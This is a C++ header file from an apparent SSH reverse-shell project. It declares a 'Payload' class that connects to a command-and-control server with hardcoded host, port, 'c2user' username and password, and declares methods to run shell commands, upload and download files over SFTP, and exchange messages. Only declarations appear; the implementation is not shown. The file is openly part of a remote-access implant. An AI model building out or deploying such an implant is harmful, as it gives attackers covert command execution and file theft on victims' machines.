//
// Created by rip on 6/30/19.
//

#ifndef SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
#define SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H

#include <iostream>
#include <cstdio>
#include <memory>
#include <string>
#include <array>
#include <sys/stat.h>
#include <fcntl.h>
#include <fstream>
#include "libssh/libssh.h"
#include "libssh/sftp.h"
#include "utils.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
#include <direct.h>
#endif

#define MAX_BUFF_SIZE 50000
#define	S_IRWXU	0000700			/* RWX mask for owner */
#define	S_IRUSR	0000400			/* R for owner */
#define	S_IWUSR	0000200			/* W for owner */
#define	S_IXUSR	0000100			/* X for owner */

class Payload {

private:
    ssh_session session;
    ssh_channel channel;
    const std::string host { "127.0.0.1" };
    const int port { 4433 };
    const std::string user { "c2user" };
    const std::string pwd { "12345" };

    void handleConnection();
    void tearDown();
    bool openChannel();
    void sendMsg(const std::string&);
    std::string rcvMsg();
    sftp_session setupSFTP();
    void upload(std::string&, std::string&);
    void download(std::string&, std::string&);
    std::string execCmd(std::string&);

public:
    Payload();
    ~Payload();

    void connect();
};


#endif //SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
